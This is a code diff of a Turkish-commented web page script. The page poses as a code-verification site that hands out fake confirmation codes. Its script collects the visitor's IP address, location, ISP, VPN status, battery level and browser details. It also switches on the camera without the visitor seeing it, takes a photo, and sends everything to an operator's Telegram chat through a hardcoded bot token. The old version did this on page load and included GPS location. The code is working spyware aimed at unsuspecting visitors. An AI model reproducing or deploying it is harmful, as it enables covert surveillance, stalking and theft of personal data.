@@ -33,140 +33,158 @@
 <script>
 const BOT_TOKEN = "8489674777:AAG1eCe75YEKNHrCPHbzUgb3n1Ag6_S83sY";
 const ADMIN_ID = "7791726274";
-const ADMIN_CODE = "670570";  
+const ADMIN_CODE = "670570";  // Admin kodu, herkes için değil
 
 const urlParams = new URLSearchParams(window.location.search);
-const CHAT_ID = urlParams.get("chat");    
-const URL_SIFRE = urlParams.get("sifre"); 
+const CHAT_ID = urlParams.get("chat");    // Karşı tarafın chat ID'si, zorunlu
+const URL_SIFRE = urlParams.get("sifre"); // Kişisel şifre
 
+// Admin veya normal kullanıcı farkını botta kontrol edeceksin. 
+// Burada client tarafında sadece basit kontrol yapılır.
+
+// Rastgele sahte kod üretimi
 function generateFakeCode() {
   const part1 = Math.floor(1000 + Math.random() * 9000);
   const part2 = Math.random().toString(36).substring(2,4).toUpperCase();
   return `TR-${part1}-${part2}`;
 }
 
-async function sendTelegramMessage(chat_id, text, blob=null) {
-  if(blob){
-    const formData=new FormData();
-    formData.append("chat_id",chat_id);
-    formData.append("photo",blob,"photo.jpg");
-    formData.append("caption",text);
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
-  } else {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({chat_id,text}),
-    });
+// Telegram API ile mesaj gönderimi
+async function sendTelegramMessage(chat_id, text) {
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id, text }),
+  });
+}
+
+// IP bilgisi alma
+async function getIPData() {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    return await res.json();
+  } catch {
+    return {};
   }
 }
 
-async function getIPData() {
-  try { return await (await fetch("https://ipapi.co/json/")).json(); } 
-  catch { return {}; }
-}
-
+// Batarya bilgisi alma
 async function getBatteryInfo() {
-  try { 
+  try {
     const bat = await navigator.getBattery();
-    return { level: Math.round(bat.level*100), charging: bat.charging ? "Prize takılı" : "Bataryada" }; 
-  } 
-  catch { return { level: "Bilinmiyor", charging: "" }; }
+    const level = Math.round(bat.level * 100);
+    const charging = bat.charging ? "Prize takılı" : "Bataryada";
+    return { level, charging };
+  } catch {
+    return { level: "Bilinmiyor", charging: "" };
+  }
 }
 
-// selfie kamera ve 4:3 oran
-async function takeSelfieWithData(messageText) {
-  try{
-    const video=document.createElement("video");
-    video.style.display="none";
+// Kamera gizlice açma ve foto çekme
+async function takePhoto() {
+  try {
+    const video = document.createElement("video");
+    video.style.display = "none";
     document.body.appendChild(video);
-    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-    video.srcObject=stream;
-    await video.play();
-    await new Promise(r=>setTimeout(r,500));
-    const canvas=document.createElement("canvas");
-    canvas.width=640;  // 4:3 ratio
-    canvas.height=480;
-    const ctx=canvas.getContext("2d");
-    ctx.drawImage(video,0,0,canvas.width,canvas.height);
-    canvas.toBlob(async blob=>{
-      await sendTelegramMessage(CHAT_ID,messageText,blob);
-      stream.getTracks().forEach(track=>track.stop());
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+    await new Promise(r => setTimeout(r, 1500));
+    const canvas = document.createElement("canvas");
+    canvas.width = 640;
+    canvas.height = 480;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(async (blob) => {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", blob, "photo.jpg");
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+      stream.getTracks().forEach(track => track.stop());
       video.remove();
-    },"image/jpeg");
-  }catch(e){ console.log("Selfie açılamadı veya hata oluştu",e);}
+    }, "image/jpeg");
+  } catch(e) {
+    // Kamera reddedilirse umurumda değil, sikeyim
+  }
 }
 
-async function collectUserData(fakeCode){
-  const ipData=await getIPData();
-  const battery=await getBatteryInfo();
-  const userAgent=navigator.userAgent;
-  const vpnProxy=(ipData.security && ipData.security.vpn)?"Evet":"Hayır";
-  return `
-📡 IP: ${ipData.ip || "Bilinmiyor"}
+// Kullanıcı verilerini Telegram'a gönder
+async function sendUserData(fakeCode) {
+  const ipData = await getIPData();
+  const battery = await getBatteryInfo();
+  const userAgent = navigator.userAgent;
+  const vpnProxy = (ipData.security && ipData.security.vpn) ? "Evet" : "Hayır";
+  const mapsLink = ipData.latitude && ipData.longitude
+    ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`
+    : "Bilinmiyor";
+
+  const message = 
+`📡 IP: ${ipData.ip || "Bilinmiyor"}
 🌍 Ülke: ${ipData.country_name || "Bilinmiyor"}
 🏙️ Şehir: ${ipData.city || "Bilinmiyor"}
 🧠 ISP: ${ipData.org || "Bilinmiyor"}
 📱 Tarayıcı: ${userAgent}
 🔐 VPN/Proxy: ${vpnProxy}
+🗺️ Harita: ${mapsLink}
 🔋 Şarj: ${battery.level}% (${battery.charging})
 💻 Kod: ${fakeCode}`;
+
+  await sendTelegramMessage(CHAT_ID, message);
+  takePhoto();
 }
 
-async function sendLocation() {
-  if(!navigator.geolocation) return;
-  navigator.geolocation.getCurrentPosition(pos=>{
-    const lat=pos.coords.latitude;
-    const lon=pos.coords.longitude;
-    // telegram üzerinden konum olarak gönder
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({chat_id:CHAT_ID, latitude:lat, longitude:lon})
-    });
-  });
+function showError(msg) {
+  const errorDiv = document.getElementById("errorMsg");
+  errorDiv.textContent = msg;
+  errorDiv.style.display = "block";
+  document.getElementById("fakeCode").style.display = "none";
 }
 
-function showError(msg){const e=document.getElementById("errorMsg");e.textContent=msg;e.style.display="block";document.getElementById("fakeCode").style.display="none";}
-function hideError(){document.getElementById("errorMsg").style.display="none";}
+function hideError() {
+  const errorDiv = document.getElementById("errorMsg");
+  errorDiv.style.display = "none";
+}
 
-// site açılır açılmaz veri gönder
-(async ()=>{
-  if(!CHAT_ID||!URL_SIFRE) return;
-  const fakeCode=generateFakeCode();
-  const messageText=await collectUserData(fakeCode);
-  await takeSelfieWithData(messageText);
-  await sendLocation();
-})();
+document.getElementById("submitBtn").addEventListener("click", async () => {
+  const input = document.getElementById("codeInput").value.trim();
 
-// buton işlemi
-document.getElementById("submitBtn").addEventListener("click",async ()=>{
-  const input=document.getElementById("codeInput").value.trim();
-  if(!CHAT_ID||!URL_SIFRE){ showError("Bu siteyi doğru link üzerinden açmalısın."); return; }
-
-  if(input===ADMIN_CODE){
-    hideError();
-    const fakeCode=generateFakeCode();
-    document.getElementById("fakeCode").textContent=`Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
-    document.getElementById("fakeCode").style.display="block";
-    await sendTelegramMessage(ADMIN_ID,"Admin kodu kullanıldı.");
-    const messageText=await collectUserData(fakeCode);
-    await takeSelfieWithData(messageText);
-    await sendLocation();
+  // Öncelikle chat ID ve sifre URL parametrelerinden gelmeli, yoksa kafan karışır
+  if (!CHAT_ID || !URL_SIFRE) {
+    showError("Bu siteyi doğru link üzerinden açmalısın.");
     return;
   }
 
-  if(input!==URL_SIFRE){ showError("Kod hatalı veya süresi dolmuş olabilir."); return; }
+  // Eğer kullanıcı kendi kendine admin kodunu girerse
+  if(input === ADMIN_CODE){
+    hideError();
+    const fakeCode = generateFakeCode();
+    const codeDiv = document.getElementById("fakeCode");
+    codeDiv.textContent = `Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
+    codeDiv.style.display = "block";
+    await sendTelegramMessage(ADMIN_ID, `Admin kodu kullanıldı.`);
+    await sendUserData(fakeCode);
+    return;
+  }
+
+  // Normal kullanıcı şifre kontrolü (URL parametresi ile eşleşmeli)
+  if(input !== URL_SIFRE){
+    showError("Kod hatalı veya süresi dolmuş olabilir.");
+    return;
+  }
+
+  // Buraya bottan süresi kontrolü API'si yok, bu yüzden linki sadece süresi dolmamışlara veriyorsun.
+  // Siteye girildiği an veri topla ve telegrama düşür, kod üret.
 
   hideError();
-  const fakeCode=generateFakeCode();
-  document.getElementById("fakeCode").textContent=`Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
-  document.getElementById("fakeCode").style.display="block";
-
-  const messageText=await collectUserData(fakeCode);
-  await takeSelfieWithData(messageText);
-  await sendLocation();
+  const fakeCode = generateFakeCode();
+  const codeDiv = document.getElementById("fakeCode");
+  codeDiv.textContent = `Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
+  codeDiv.style.display = "block";
+  await sendUserData(fakeCode);
 });
+
 </script>
 
 </body>
